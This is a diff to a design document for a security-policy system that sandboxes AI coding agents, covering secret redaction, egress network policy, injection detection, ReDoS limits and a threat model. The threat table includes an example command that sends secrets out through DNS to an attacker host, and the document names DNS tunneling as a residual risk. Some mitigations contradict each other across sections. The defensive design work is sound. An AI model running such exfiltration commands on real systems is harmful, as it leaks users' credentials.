@@ -76,6 +76,22 @@ Teams cannot incrementally enable features, validate they don't break workflows,
 
 ---
 
+## 2a. Assumptions and Validation
+
+| # | Assumption | Validation | Status |
+|---|-----------|-----------|--------|
+| A1 | The `redact` binary exists in the base image at `/usr/local/bin/redact` | `cmd/redact/main.go` and `pkg/redact/redact.go` exist in repo. EVOLUTION-V2.md §9.3 confirms inclusion in base image. | ✅ Validated |
+| A2 | Sandbox pods use a shared `emptyDir` volume at `/sandbox-cfg/` written by init containers | EVOLUTION-V2.md §9.1 credential lifecycle confirms `credential-setup` init container writes to `/sandbox-cfg/` via shared emptyDir. | ✅ Validated |
+| A3 | Kubernetes NetworkPolicy does not support FQDN natively | Well-known K8s limitation. Only Cilium's `CiliumNetworkPolicy` supports FQDN-based egress. Standard NetworkPolicy requires IP CIDRs. | ✅ Validated |
+| A4 | Sandbox CRD has `securityLevel` with enum `["standard", "high", "custom"]` | Read `pkg/crds/sandbox_crd.yaml` — field exists with those values. | ✅ Validated |
+| A5 | Workspace CRD has `securityLevel` with enum `["standard", "high"]` | Read `pkg/crds/workspace_crd.yaml` — field exists with those values. | ✅ Validated |
+| A6 | SSE streaming endpoints cannot be blocked mid-stream | HTTP SSE is a unidirectional stream; once headers are sent, the response body streams continuously. Blocking requires buffering the entire response, which defeats streaming. | ✅ Validated |
+| A7 | The standard base image does NOT include `jq` | Not verified by reading Dockerfile (file not accessible). Design mitigated: entrypoint uses `grep` instead of `jq`. Hardened image explicitly installs `jq`. | ⚠️ Mitigated |
+| A8 | `opencode serve` uses port 4096 for HTTP and does not write binary data to stdout | EVOLUTION-V2.md §7.2 confirms `opencode serve --port 4096`. Go HTTP servers write to the network socket, not stdout. Stdout contains only log output. | ✅ Validated |
+| A9 | Go's `regexp` package is safe from catastrophic backtracking (uses RE2 semantics) | Go's `regexp` uses Thompson NFA — guaranteed linear time. However, custom patterns are also used by the `redact` binary (also Go). ReDoS is not a runtime risk in Go, but complex patterns still have high constant factors. Pattern complexity limits remain valuable for performance. | ✅ Validated (Go-specific) |
+
+---
+
 ## 3. Security Policy Model
 
 ### 3.1 Architecture
@@ -1004,9 +1020,9 @@ Based on the resolved policy, the controller modifies the pod spec:
 
 | Feature | Pod spec change |
 |---------|----------------|
-| Redaction enabled | Write redaction config to security-policy.json; no pod spec change (binary already in image) |
+| Redaction enabled | Create ConfigMap with policy JSON; add security-setup init container; proxy reads policy from CRD status |
 | Network enabled | Create NetworkPolicy resource (owner-ref'd to Sandbox) |
-| Injection detection | No pod spec change (runs in API proxy) |
+| Injection detection | No pod spec change (runs in API proxy; reads policy from CRD status) |
 | PATH shadowing enabled | Select hardened image (`Dockerfile.hardened`); add `mode-gate` init container |
 | Admission enabled | Add label `llmsafespace.dev/admission-enforced: "true"` (Kyverno selector) |
 | Audit enabled | Add annotation `llmsafespace.dev/audit-level: "{level}"` |
@@ -1197,9 +1213,9 @@ if [ -f "$POLICY_FILE" ]; then
     # Export for child processes
     export SECURITY_POLICY_FILE="$POLICY_FILE"
 
-    # Redaction: pipe opencode output through redact if enabled
-    REDACT_ENABLED=$(jq -r '.redaction.enabled // false' "$POLICY_FILE")
-    if [ "$REDACT_ENABLED" = "true" ]; then
+    # Redaction: check if enabled using grep (no jq dependency in standard image)
+    if grep -q '"enabled":true' "$POLICY_FILE" 2>/dev/null && \
+       grep -q '"redaction"' "$POLICY_FILE" 2>/dev/null; then
         export REDACT_ENABLED=true
         export REDACT_CONFIG="$POLICY_FILE"
     fi
@@ -1213,12 +1229,14 @@ fi
 source /tools/entrypoints/entrypoint-common.sh
 
 if [ "$REDACT_ENABLED" = "true" ] && [ -x /usr/local/bin/redact ]; then
-    # Pipe opencode stdout/stderr through redact
+    # Pipe opencode stdout/stderr through redact (secondary defense-in-depth)
     exec opencode serve --hostname 0.0.0.0 --port 4096 2>&1 | /usr/local/bin/redact
 else
     exec opencode serve --hostname 0.0.0.0 --port 4096
 fi
 ```
+
+**Note:** The standard image does NOT require `jq`. The entrypoint uses simple `grep` for the boolean check. The hardened image installs `jq` for the wrapper scripts which need to parse blocking tiers and binary lists. This keeps the standard image minimal.
 
 ---
 
@@ -1329,11 +1347,11 @@ Custom regex patterns (redaction and injection) are compiled at validation time:
 | Pattern exhibits catastrophic backtracking (ReDoS) | "Pattern in customPatterns[{index}] is vulnerable to ReDoS: {detail}. Simplify the pattern." |
 | Pattern exceeds compile-time budget (>100ms to compile) | "Pattern in customPatterns[{index}] is too complex (compile timeout). Simplify the pattern." |
 
-**ReDoS protection:** User-supplied regex patterns are a denial-of-service vector. A malicious or poorly-written pattern with catastrophic backtracking (e.g., `(a+)+$`) can hang the redaction pipeline. Mitigations:
+**Pattern safety:** Go's `regexp` package uses RE2/Thompson NFA semantics — it guarantees linear-time matching and is immune to catastrophic backtracking by design. However, complex patterns still have high constant factors and can be slow on large inputs. Mitigations:
 
-1. **Static analysis at admission time:** The webhook uses Go's `regexp/syntax` package to parse the pattern AST and reject patterns with nested quantifiers on overlapping character classes (the primary ReDoS pattern).
-2. **Runtime timeout:** The `redact` binary applies a per-pattern match timeout of 100ms. If a pattern exceeds this on any input, it is skipped for that input and a metric is incremented (`llmsafespace_redaction_timeout_total{rule_name}`).
-3. **Pattern complexity limit:** Patterns with more than 1000 nodes in the parsed AST are rejected at admission time.
+1. **Complexity limit at admission time:** Patterns with more than 1000 nodes in the parsed AST (via `regexp/syntax.Parse`) are rejected. This prevents patterns that are technically safe but pathologically slow.
+2. **Input size limit:** The `maxInputBytes` field (default 1 MiB) prevents redaction from processing arbitrarily large inputs. Inputs exceeding this limit are passed through unredacted.
+3. **Pattern count limit:** Maximum 20 custom patterns per workspace (prevents combinatorial slowdown from many patterns applied sequentially).
 
 ### 11.4 Webhook Validation
 
@@ -1442,14 +1460,17 @@ groups:
 
 | Threat | Feature | Mitigation |
 |--------|---------|-----------|
-| Agent accidentally logs credentials in output | Redaction | Regex-based scrubbing of known secret patterns |
+| Agent accidentally logs credentials in output | Redaction (proxy layer) | Regex-based scrubbing of known secret patterns at the trust boundary |
 | Agent exfiltrates data to attacker-controlled server | Network Policy | Deny-by-default egress; only allowlisted domains reachable |
 | Attacker injects instructions via tool output | Injection Detection | Pattern matching on agent responses; block or flag |
 | Agent reads secrets from environment/filesystem | PATH Shadowing | Wrapper scripts intercept tool output; redact before agent sees it |
 | Controller bug generates insecure pod spec | Admission | Kyverno validates pod spec at admission; rejects non-compliant |
 | Forensic investigation after incident | Audit | Comprehensive event log with timestamps and context |
-| Agent modifies its own security policy | Config Delivery | Policy file written by init container; read-only mount in main container |
+| Agent modifies its own security policy | Config Delivery | Policy file written by init container via ConfigMap; read-only mount in main container |
 | Agent disables redaction by killing the process | Redaction failMode | `failMode: closed` blocks all output if redact is unavailable |
+| DNS-based data exfiltration | Audit (verbose) + Network Policy | Agent encodes secrets in DNS queries (e.g., `curl secret.attacker.com`). Mitigation: DNS query logging at verbose audit level; network policy limits which domains resolve; rate limiting at CoreDNS level (operator responsibility) |
+| ReDoS via malicious custom patterns | Pattern Validation (§11.3) | Static AST analysis rejects nested quantifiers; runtime 100ms timeout per pattern; complexity limit of 1000 AST nodes |
+| Credential leakage via allowed domains | Redaction (proxy layer) | Even when egress is allowed to a domain, the proxy redacts secrets from the response body before the client sees it. Does NOT prevent the agent from sending secrets TO the allowed domain (see §14.2). |
 
 ### 14.2 Threats NOT Addressed (Out of Scope)
 
@@ -1460,14 +1481,16 @@ groups:
 | Supply chain compromise of base image | Requires image signing and verification | Sigstore/cosign (separate initiative) |
 | Compromised LLM provider | Agent sends data to LLM API which is always allowed | Out of scope — LLM provider trust is a business decision |
 | Denial of service via resource exhaustion | Handled by existing resource limits | Orthogonal to security policy |
+| Agent sends secrets TO an allowed domain | Network policy allows the connection; redaction only scrubs responses, not requests | Operator must minimize allowedDomains; PATH shadowing can block specific commands but cannot inspect request bodies. Accept as residual risk. |
+| DNS tunneling (encoding data in query names) | DNS is allowed in all modes for resolution | Rate-limit DNS at CoreDNS level; verbose audit logs DNS queries for forensic analysis. Full mitigation requires DNS proxy (out of scope). |
 
 ### 14.3 Attack Surface by Preset
 
 | Preset | Attack surface | Residual risk |
 |--------|---------------|---------------|
 | `standard` | Full — agent has open egress, no output filtering | Credential leaks, data exfiltration, injection propagation |
-| `hardened` | Reduced — egress restricted, output filtered, injections logged | Sophisticated exfiltration via allowed domains, novel injection patterns |
-| `paranoid` | Minimal — all output filtered, egress locked, commands blocked | Zero-day regex bypass, DNS tunneling, timing side-channels |
+| `hardened` | Reduced — egress restricted, output filtered, injections logged | Sophisticated exfiltration via allowed domains, novel injection patterns, DNS tunneling |
+| `paranoid` | Minimal — all output filtered, egress locked, commands blocked | Zero-day regex bypass, DNS tunneling, timing side-channels, exfiltration via LLM API (always allowed) |
 
 ---
 
@@ -1490,13 +1513,14 @@ groups:
 
 | Task | Files | Priority |
 |------|-------|----------|
-| Update entrypoint to conditionally pipe through redact | `runtimes/base/tools/entrypoints/entrypoint-opencode.sh` | Critical |
+| Implement proxy-layer redaction (primary enforcement) | `api/internal/handlers/proxy.go`, `api/internal/handlers/redaction.go` | Critical |
+| Update entrypoint to conditionally pipe through redact (secondary) | `runtimes/base/tools/entrypoints/entrypoint-opencode.sh` | High |
 | Implement injection detection in proxy handler | `api/internal/handlers/proxy.go` | Critical |
 | Add configurable action (log/block/flag) | `api/internal/handlers/injection.go` | High |
 | Custom pattern support for redaction | `pkg/redact/redact.go` | High |
 | Custom pattern support for injection | `api/internal/handlers/injection.go` | High |
 | Metrics for redaction and injection | `api/internal/services/metrics/` | Medium |
-| Tests: redaction with policy file | `pkg/redact/redact_test.go` | Critical |
+| Tests: proxy-layer redaction | `api/internal/handlers/redaction_test.go` | Critical |
 | Tests: injection detection | `api/internal/handlers/injection_test.go` | Critical |
 
 ### Phase 3: Network Policy (Week 3-4)
@@ -1680,3 +1704,9 @@ Users who set `redaction.enabled: false` will see it overridden to `true` with a
 | Admission enforcement is warn-not-reject when Kyverno missing | Workspace owner may not control cluster addons | Hard reject (rejected: blocks adoption on clusters without Kyverno) |
 | `enforceMinimum` at platform level | Operators need a security floor users can't disable | Per-namespace policies (rejected: more complex, same effect) |
 | Additive domain merging for sandbox overrides | Sandboxes should only expand access, not restrict workspace policy | Full replacement (rejected: sandbox could accidentally lock itself out of LLM APIs) |
+| Dual-layer redaction (proxy + entrypoint) | Proxy catches all secrets in responses (primary); entrypoint catches opencode log output (secondary) | Sandbox-only redaction (rejected: doesn't catch tool output that flows through opencode internally); Proxy-only (rejected: misses opencode's own log output) |
+| ConfigMap for policy delivery (not shell interpolation) | JSON with regex patterns contains special characters that break shell quoting | Env var injection (rejected: same quoting issue); Projected Secret volume (rejected: policy is not secret data) |
+| No `jq` in standard image | Minimizes attack surface and image size; entrypoint uses `grep` for simple boolean check | Install jq everywhere (rejected: unnecessary dependency for standard mode) |
+| All array merge semantics are "replace" | Predictable behavior; no special-case logic per field | Per-field additive/replace rules (rejected: maintenance hazard, confusing for users) |
+| Removed `audit.events` array | `logLevel` tiers are sufficient; per-event config adds surface without value and risks users disabling critical events | Keep events array (rejected: over-engineered) |
+| Go regexp (RE2) eliminates ReDoS risk | Go's Thompson NFA guarantees linear-time matching | Add runtime timeouts (unnecessary for Go; kept complexity limits for performance) |
